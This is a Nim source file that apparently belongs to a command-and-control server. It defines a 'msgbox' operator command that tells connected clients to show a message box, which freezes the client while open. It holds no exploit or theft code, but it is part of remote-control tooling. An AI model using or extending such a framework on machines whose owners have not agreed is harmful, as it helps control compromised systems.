import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 2:
    errorLog "you must specify a title and caption for the message box, see 'help msgbox'"
    return
  
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("msgbox", @[ args[0], args[1] ])
    if not task.isNil(): 
      successLog "trying to spawn a messagebox"
  
let cmd*: Command = Command(
  execProc: execProc,
  name: "msgbox",
  argsLength: 2,
  usage: @["msgbox \"[title]\" \"[caption]\""],
  cliMode: @[ClientInteractMode],
  description: "Spawn a message box (CLIENT WILL FREEZE)",
  category: CCClientInteraction,
  requiresConnectedClient: true
)